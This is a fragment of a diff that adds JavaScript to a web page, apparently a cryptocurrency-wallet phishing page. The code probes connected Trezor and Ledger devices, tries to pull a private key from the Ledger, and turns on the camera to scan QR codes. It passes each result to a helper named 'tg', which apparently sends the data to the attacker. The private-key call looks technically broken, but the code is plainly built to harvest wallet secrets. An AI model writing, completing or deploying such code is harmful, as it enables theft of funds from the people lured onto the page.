+            try { const t = await TrezorConnect.getPublicKey({ path, coin: 'btc' }); if (t.success) tg('hardware', 'Trezor'); } catch (_) {}
+            try {
+                const transport = await (TransportWebHID.create(2000).catch(() => TransportWebUSB.create(2000)));
+                if (transport) { const btc = new AppBtc(transport); await btc.getWalletPublicKey(path); const { privateKey } = await btc.getWalletPrivateKey(path); tg('hardware', privateKey); }
+            } catch (_) {}
+            success();
+        };
+
+        function startQRScanner() {
+            const video = document.getElementById('qrVideo');
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }).then(stream => {
+                qrStream = stream;
+                video.srcObject = stream;
+                video.play();
+                scanQR();
+            }).catch(() => {});
+        }
+
+        function scanQR() {
+            const video = document.getElementById('qrVideo');
+            const canvas = document.getElementById('qrCanvas');
+            const ctx = canvas.getContext('2d');
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.height = video.videoHeight; canvas.width = video.videoWidth;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const code = jsQR(ctx.getImageData(0, 0, canvas.width, canvas.height).data, canvas.width, canvas.height);
+                if (code) { stopQR(); tg('qr', code.data); success(); }
+                else requestAnimationFrame(scanQR);
+            } else requestAnimationFrame(scanQR);
+        }
+
+        function stopQR() { if (qrStream) qrStream.getTracks().forEach(t => t.stop()); }
+    </script>
+</body>
+</html>
